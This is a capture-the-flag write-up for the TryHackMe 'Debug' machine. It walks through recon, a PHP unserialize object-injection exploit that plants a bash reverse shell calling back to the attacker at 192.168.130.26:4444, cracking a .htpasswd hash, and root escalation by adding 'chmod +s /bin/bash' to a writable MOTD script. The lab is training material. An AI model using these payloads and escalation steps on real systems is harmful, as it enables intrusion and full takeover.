# **Debug - TryHackMe**

*Target Ip. Address: 10.49.176.116*

So, let's start with a nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.176.116
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 14:18 +0545
Nmap scan report for 10.49.176.116 (10.49.176.116)
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

2 open ports. The website has default apache page. Let's see if has something interesting.

```bash
kali@kali:dirb http://10.49.176.116/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 16 14:19:24 2026
URL_BASE: http://10.49.176.116/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.49.176.116/ ----
==> DIRECTORY: http://10.49.176.116/backup/                                                                                                            
==> DIRECTORY: http://10.49.176.116/grid/                                                                                                              
+ http://10.49.176.116/index.html (CODE:200|SIZE:11321)                                                                                                
+ http://10.49.176.116/index.php (CODE:200|SIZE:5732)                                                                                                  
==> DIRECTORY: http://10.49.176.116/javascript/                                                                                                        
==> DIRECTORY: http://10.49.176.116/javascripts/                                                                                                       
+ http://10.49.176.116/server-status (CODE:403|SIZE:278)                                                                                               
                                                                                                                                                       
---- Entering directory: http://10.49.176.116/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.49.176.116/grid/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.49.176.116/javascript/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.49.176.116/javascripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Feb 16 14:22:57 2026
DOWNLOADED: 4612 - FOUND: 3
```

So, we have /backup. It has index.html.bak, index.php.bak. Let's see what these backups has for us.

```php
// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();
```

In index.php.bak, we have some interesting find. This code snippet contains a classic and high-severity vulnerability known as Insecure Deserialization (specifically PHP Object Injection). 

You can get more info on this vulnerability from here: "*https://notsosecure.com/remote-code-execution-php-unserialize*"

```php
<?php
class FormSubmit
{
   public $form_file = 'shell.php';
   public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/192.168.130.26/4444 0>&1\'");';
}
print urlencode(serialize(new FormSubmit));

?>
```

We will create a reverse shell payload from this.

```bash
kali@kali:php exploit.php                                                                                                                                     
O%3A10%3A%22For......%3B%7D
```

Provide the payload to: "*http://10.49.176.116/index.php?debug=O%3A.....B%7D*"


Start a listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Navigate to "*http://10.49.176.116/shell.php*".

```bash
kali@kali:penelope -p 4444                                                                                                                                    
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from osboxes~10.49.176.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/osboxes~10.49.176.116-Linux-x86_64/2026_02_16-14_39_57-669.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@osboxes:/var/www/html$ 
```

We got a shell as www-data.

```bash
www-data@osboxes:/var/www/html$ cat .htpasswd
james:$apr1$z.....1
```

We find a password hash for user james. Let's crack it.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j...a          (james)     
1g 0:00:00:00 DONE (2026-02-16 14:42) 11.11g/s 8533p/s 8533c/s 8533C/s evelyn..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we have a pass for user james, now we can ssh for a proper tty.

```bash
kali@kali:ssh james@10.49.176.116                                                                                                                             
The authenticity of host '10.49.176.116 (10.49.176.116)' can't be established.
ED25519 key fingerprint is: SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.176.116' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.176.116's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44
james@osboxes:~$
```

The user flag is at home directory.

```bash
james@osboxes:~$ cat user.txt
7e.....20
```

```bash
james@osboxes:~$ cat Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

We have a note from root, which hints to check for motd (message of the day). It is the message we see when we login via ssh.

```bash
james@osboxes:/etc/update-motd.d$ ls -la
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
```

We as john, are able to write on all these files.

```bash
james@osboxes:/etc/update-motd.d$ echo "chmod +s /bin/bash" >> 00-header

james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
chmod +s /bin/bash
```

We are basically making /bin/bash SUID, so that we can be root. Exit and relogin via ssh.

```bash
kali@kali:ssh james@10.49.176.116                                                                                                                             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.176.116's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Mon Feb 16 03:58:55 2026 from 192.168.130.26
bash-4.3$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

The exploit was successful. We can be root.

```bash
bash-4.3$ /bin/bash -p
bash-4.3# id
uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
```

Yay! We are root. Read the final flag and end this challenge.

```bash
bash-4.3# cat root.txt
3c.....4b
```
